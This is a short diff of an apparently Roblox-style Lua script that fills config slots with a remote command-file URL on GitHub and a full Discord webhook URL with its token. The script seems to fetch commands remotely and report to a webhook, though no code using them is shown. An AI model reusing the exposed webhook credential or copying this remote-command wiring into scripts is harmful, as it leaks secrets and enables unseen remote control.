@@ -29,8 +29,8 @@ local whitelistGames = {
 }
 
 -- [PLACE YOUR ENCRYPTED URLs BELOW]
-local ENCRYPTED_COMMAND_URL = ""   -- أدخل السلسلة المشفرة لـ command.txt
-local ENCRYPTED_WEBHOOK_URL = ""   -- أدخل السلسلة المشفرة لـ Discord webhook
+local ENCRYPTED_COMMAND_URL = "https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/refs/heads/main/command.txt"  
+local ENCRYPTED_WEBHOOK_URL = "https://discord.com/api/webhooks/1498774911274057768/C2mfYbJc1R6QVfzuiH3It-vxmvv1mR8yNtGO9HT9hx8y-SkMKk_5lHSvhmbLxV1Yx5nJ" 
 
 -- ===================[ ENCRYPTION SYSTEM ]===================
 local ENC_SALT = "TeamOmegaSalt#2024!@#%^&*()_+{}|:<>?"
